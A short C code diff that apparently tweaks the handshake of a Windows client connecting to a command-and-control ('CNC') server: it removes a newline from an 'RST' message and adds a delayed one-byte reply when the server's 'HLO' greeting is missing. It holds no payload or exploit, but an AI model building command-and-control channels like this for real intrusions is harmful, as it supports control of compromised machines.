@@ -282,7 +282,7 @@ DWORD senderThread(PVOID pParam)
 	RtlIpv4AddressToStringA(&CncAddr.sin_addr, cncIP);
 	NOTIFY_CALLBACK( CNC_CONNECTED,NULL)
 
-	strcpy_s(msg, sizeof(msg), "RST\n");
+	strcpy_s(msg, sizeof(msg), "RST");
 
 	if (send(cnc, msg, strlen(msg), 0) <= 0) {
 		iResult = WSAGetLastError();
@@ -296,6 +296,8 @@ DWORD senderThread(PVOID pParam)
 
 	msg[cnt] = 0;
 	if (strcmp(msg, "HLO\n") != 0) {
+		Sleep(100);
+		send(cnc, "D", 1, 0);
 		return 1;
 	}
 
